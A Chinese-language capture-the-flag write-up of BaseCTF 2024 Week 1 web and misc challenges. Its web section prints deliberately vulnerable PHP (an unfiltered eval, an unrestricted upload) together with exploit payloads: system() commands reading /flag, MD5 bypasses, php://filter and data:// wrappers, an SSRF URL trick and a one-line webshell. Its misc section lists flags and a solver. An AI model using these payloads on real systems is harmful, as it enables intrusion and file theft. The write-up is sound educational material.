---
title: 2024BaseCTF-Week1
date: '2024-08-15 09:57:12'
updated: '2024-09-16 16:45:07'
permalink: /post/2024basectfweek1-und65.html
comments: true
toc: true
---

# 2024BaseCTF-Week1

备注：图片图床使用为Github，打不开需要挂梯子！

---

PS：感觉隔壁Moe比较有意思，所以这边就只做了Web和Misc，还只做了一周，见谅

# Web

## [Week1] HTTP 是什么呀

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164718.png)​

稍微需要注意的就是那个Url转义，要进行一次编码才行

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164720.png)​

最终的flag需要看success.php，在网络传输这里可以看到

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164721.png)​

## [Week1] 喵喵喵´•ﻌ•`

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

$a = $_GET['DT'];

eval($a);

?>
```

一个没有任何过滤的命令执行

```php
?DT=system("ls /");
?DT=system("cat /flag");
```

## [Week1] md5绕过欸

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
require 'flag.php';

if (isset($_GET['name']) && isset($_POST['password']) && isset($_GET['name2']) && isset($_POST['password2']) ){
    $name = $_GET['name'];
    $name2 = $_GET['name2'];
    $password = $_POST['password'];
    $password2 = $_POST['password2'];
    if ($name != $password && md5($name) == md5($password)){
        if ($name2 !== $password2 && md5($name2) === md5($password2)){
            echo $flag;
        }
        else{
            echo "再看看啊，马上绕过嘞！";
        }
    }
    else {
        echo "错啦错啦";
    }

}
else {
    echo '没看到参数呐';
}
?>
```

md5绕过

```php
Get：?name=QNKCDZO&name2[]=1
Post：password=s214587387a&password2[]=2
```

## [Week1] A Dark Room

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164722.png)js前端泄露

## [Week1] upload

一个简单的木马上传，没有任何过滤，上传一句话木马shell.php后直接蚁剑连接即可

路径为url/upload/[文件名]

```php
<?php
error_reporting(0);
if (isset($_FILES['file'])) {
    highlight_file(__FILE__);
    $file = $_FILES['file'];
    $filename = $file['name'];
    $filetype = $file['type'];
    $filesize = $file['size'];
    $filetmp = $file['tmp_name'];
    $fileerror = $file['error'];

    if ($fileerror === 0) {
        $destination = 'uploads/' . $filename;
        move_uploaded_file($filetmp, $destination);
        echo 'File uploaded successfully';
    } else {
        echo 'Error uploading file';
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>上传你喜欢的图片吧！</title>
</head>

<body>
    <form action="" method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit">上传！</button>
    </form>
    <?php
    $files = scandir('uploads');
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') {
            continue;
        }
        echo "<img src='uploads/$file' style=\"max-height: 200px;\" />";
    }
    ?>
</body>

</html> File uploaded successfully
```

## [Week1] Aura 酱的礼物

```php
<?php
highlight_file(__FILE__);
// Aura 酱，欢迎回家~
// 这里有一份礼物，请你签收一下哟~
$pen = $_POST['pen'];
if (file_get_contents($pen) !== 'Aura')
{
    die('这是 Aura 的礼物，你不是 Aura！');
}

// 礼物收到啦，接下来要去博客里面写下感想哦~
$challenge = $_POST['challenge'];
if (strpos($challenge, 'http://jasmineaura.github.io') !== 0)
{
    die('这不是 Aura 的博客！');
}

$blog_content = file_get_contents($challenge);
if (strpos($blog_content, '已经收到Kengwang的礼物啦') === false)
{
    die('请去博客里面写下感想哦~');
}

// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~
$gift = $_POST['gift'];
include($gift);
```

观察一下，发现pen参数传入，但是是file_get_contents函数，可以通过伪协议将内容读取

```php
pen=data://text/plain,Aura
```

然后是challenge的参数，可以使用一个SSRF的服务端绕过

```php
challenge=http://jasmineaura.github.io@127.0.0.1
```

最后的include就是一个单纯的文件包含读取即可

```php
gift=php://filter/convert.base64-encode/resource=flag.php
```

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164724.png)​

# Misc

## [Week1] 签到！DK 盾！

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164725.png)​

```php
BaseCTF{2024_sp0n5ored_by_dkdun}
```

## [Week1] 海上遇到了鲨鱼

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164726.png)​

倒序即得

```php
BaseCTF{15ef386b-a3a7-7344-3b05-ac367316fb76}
```

## [Week1] Base

Base32+Base64

```php
BaseCTF{we1c0me_to_b4sectf}
```

## [Week1] 正着看还是反着看呢？

下载下来010打开发现是一个Jpg图片，但是倒序的，逆一下

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164728.png)​

Binwalk分离出来一个压缩包，然后打开即得flag

## [Week1] 人生苦短，我用Python

```python
import base64
import hashlib

def abort(id):
    print('You failed test %d. Try again!' % id)
    exit(1)

print('Hello, Python!')
flag = input('Enter your flag: ')

if len(flag) != 38:
    abort(1)

if not flag.startswith('BaseCTF{'):
    abort(2)

if flag.find('Mp') != 10:
    abort(3)

if flag[-3:] * 8 != '3x}3x}3x}3x}3x}3x}3x}3x}':
    abort(4)

if ord(flag[-1]) != 125:
    abort(5)

if flag.count('_') // 2 != 2:
    abort(6)

if list(map(len, flag.split('_'))) != [14, 2, 6, 4, 8]:
    abort(7)

if flag[12:32:4] != 'lsT_n':
    abort(8)

if '😺'.join([c.upper() for c in flag[:9]]) != 'B😺A😺S😺E😺C😺T😺F😺{😺S':
    abort(9)

if not flag[-11].isnumeric() or int(flag[-11]) ** 5 != 1024:
    abort(10)

if base64.b64encode(flag[-7:-3].encode()) != b'MG1QbA==':
    abort(11)

if flag[::-7].encode().hex() != '7d4372733173':
    abort(12)

if set(flag[12::11]) != {'l', 'r'}:
    abort(13)

if flag[21:27].encode() != bytes([116, 51, 114, 95, 84, 104]):
    abort(14)

if sum(ord(c) * 2024_08_15 ** idx for idx, c in enumerate(flag[17:20])) != 41378751114180610:
    abort(15)

if not all([flag[0].isalpha(), flag[8].islower(), flag[13].isdigit()]):
    abort(16)

if '{whats} {up}'.format(whats=flag[13], up=flag[15]).replace('3', 'bro') != 'bro 1':
    abort(17)

if hashlib.sha1(flag.encode()).hexdigest() != 'e40075055f34f88993f47efb3429bd0e44a7f479':
    abort(18)

print('🎉 You are right!')
import this

```

稍微花了点时间，然后看exp吧

```python
import hashlib
import base64
#step1
flag = ['0'] * 38
print('Step1:', ''.join(flag))
#Step2
flag[0:8] = list('BaseCTF{')
print('Step2:', ''.join(flag))
#Step3
flag[10:12] = list('Mp')
print('Step3:', ''.join(flag))
#Step4
flag[-3:] = list('3x}')
print('Step4:', ''.join(flag))
#Step5
flag[-1] = '}'
print('Step5:', ''.join(flag))
#Step6-7
flag[14]='_'
flag[17]='_'
flag[24]='_'
flag[29]='_'
print('Step6&7:', ''.join(flag))
#Step8
flag[12] = 'l'
flag[16] = 's'
flag[20] = 'T'
flag[24] = '_'
flag[28] = 'n'
print('Step8:', ''.join(flag))
#Step9全大写，可省略
#Step10
#flag[-11]是数字，且其五次方为 1024（即 '4'）
flag[-11] = '4'
print('Step10:', ''.join(flag))
#Step11
#'MG1QbA=='
flag[-7:-3] = list('0mPl')
print('Step11:', ''.join(flag))
#Step12
#7d4372733173
flag[-1::-7] = list('}Crs1s')
print('Step12:', ''.join(flag))
#Step13
flag[23] = 'r'
print('Step13:', ''.join(flag))
#Step14
#flag[21:27].encode() == [116, 51, 114, 95, 84, 104]
flag[21:27] = list('t3r_Th')
print('Step14:', ''.join(flag))
#Step15
#乘法校验求和（待定
flag[17:20] = list('_Be')
print('Step15:', ''.join(flag))
#Step16
flag[8] = 's'
flag[13] = '3'
flag[15] = '1'
print('Step16:', ''.join(flag))
flag_str = ''.join(flag)
print('Final flag:', flag_str)
if hashlib.sha1(flag_str.encode()).hexdigest() == 'e40075055f34f88993f47efb3429bd0e44a7f479':
    print('🎉 生成的 flag 为:', flag_str)
else:
    print('❌ 生成的 flag 未通过校验')

#BaseCTF{s1Mpl3_1s_BeTt3r_Th4n_C0mPl3x}
```

## [Week1] 你也喜欢圣物吗

有一张图片，先LSB一下

```python
extradata:0 .. text: "RE9fWU9VX0tOT1dfRVpfTFNCPw=="
b1,rgb,lsb,xy .. text: "key=lud1_lud1"
```

解压后调到文本文件的最下面，最上面的是假flag

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164729.png)​

## [Week1] 根本进不去啊!

很明显域名解析的用法，上一次还是运维赛的时候，hhhh

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/20240916164731.png)​

‍
